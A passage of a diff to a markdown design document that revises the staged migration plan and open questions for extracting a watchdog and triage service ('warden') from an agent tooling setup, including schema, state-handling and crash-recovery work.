-| **4** | `deploy-targets.json`; CI-where-possible; `verify` tier. | The last mile, for the repos that genuinely cannot have CI. |
-| **5** | Argo operator console. | Needs waves 1–3 to have something worth rendering. |
-| **6** | `review` tier for any PR, off CodeRabbit's quota. | Independent; last because it is additive, not blocking. |
+Wave 0 is **not** a `git mv`, which v1 got wrong. `~/.hermes/{scripts,config}` are
+whole-directory symlinks shared with ~10 hermes-agent-only scripts;
+`agents-overview.py` (staying) depends on `hermes-cc.sh` (leaving);
+`watchdog.db` is not in git at all and needs a stop-copy-verify migration;
+`watchdog-slack.py` and `dispatch-sweep-cron.py` become orphaned; the Ed25519
+verifier needs `cryptography` from a venv that does not exist yet;
+`test_dispatch_approval.py` straddles both repos. **2–3 days.**
 
-Wave 0 is roughly a day — the code is already file-separated, the DB is already
-its own file, the LaunchAgent already exists, and the tests already run standalone.
+| Wave | What |
+|-|-|
+| **0** | Extract. Re-assert the repo allowlist **inside sideclaw**. Typed `outcome` enum + versioned verdict schema. WAL, one writer, one migrator, `schema_version`, backup. Promote the two cron jobs to LaunchAgents; delete the orphan wrappers. |
+| **1** | Intent/signature split. Slack repointed. CLI decide path. Deadlines and `state_deadline` on every chain state. Fix the quiet rule. |
+| **2** | Honest states + `dismissed` (cheap — the enum value already exists unconsumed). `/metrics`. Fix the reopen condition before any re-render work. |
+| **3** | Abort, revert, per-repo lock, crash reconciliation with `unknown`. Prove one complete path survives a kill at every boundary. |
+| **4** | Argo console. |
+| **5+** | New origins (`github_issue`, `github_pr`, `human`), deploy keys beyond the seeded one, `review` tier. |
+
+The reordering is deliberate and follows the out-of-family review: **prove one
+complete path — actionable verdict → recorded disposition → authorized operation
+→ reconciled deployment → positive verification, with an explicit failure outcome
+— and kill the process at every boundary to show it neither drops the obligation
+nor repeats an unsafe action.** Additional origins and surfaces before that only
+feed and display the same hole.
 
 ---
 
 ## Open questions
 
-1. **Does warden keep Python?** The extraction is trivial in Python and a rewrite
-   is not on the critical path. But sideclaw and Argo are Bun/TS, and the HTTP
-   API is the one new surface. Recommendation: keep Python for the loop, and
-   write the API in Python too rather than splitting the repo across runtimes for
-   aesthetics.
-2. **Slack interactivity after extraction.** Buttons need Socket Mode, which is
-   the gateway. Either the gateway plugin becomes a thin client of `/decide`
-   (simple, but buttons die with the gateway), or warden runs its own minimal
-   Slack app (independent, more moving parts). Leaning thin client, because Argo
-   is the surface that must survive.
-3. **Three unmapped UptimeKuma group monitors** — `uk:95` ("VPS"), `uk:179`
-   ("Services"), `uk:186` ("Local"). Needs the operator to say which repo owns
-   each; guessing routes real alerts into the wrong repo permanently.
-4. **`stray_skill` 849** — an agent-created skill with 86 patches living outside
-   `skills.external_dirs`, flagged eight days, never triaged. Is `stray_skill` a
-   warden origin or a hermes concern?
-5. **Cluster feedback.** Episodes are returning "re-triage these two together as
-   one" — a shape the loop cannot parse. Today it only understands
-   `UNRELATED SIGNATURES`. Worth an inverse marker, or is that over-fitting?
+1. **Does warden keep Python?** Recommendation: yes, including the read-only API.
+2. **`hermes-cc.sh` splits four ways** (above) — who owns the GitHub module, and
+   does `agents-overview.py` get a compat path or its own client?
+3. **`stray_skill` 849** — an agent-created skill, 86 patches, outside
+   `skills.external_dirs`, flagged 8 days, and **no `triage_items` row exists for
+   it at all**. Warden origin or hermes concern?
+4. **Cluster feedback** — an inverse of `UNRELATED SIGNATURES`, or over-fitting?
+   See *Known limit*.
+
+Resolved since v1: `uk:95` / `uk:179` / `uk:186` are UptimeKuma **group** monitors
+matching `homelab/uptime-kuma/monitors.yaml` group names verbatim — mappable
+without guessing. Note `uk:186` ("Local") is the parent whose child message is the
+unmapped `slack_alert` in the brain-sync triple-failure: a known bug, not a naming
+question.
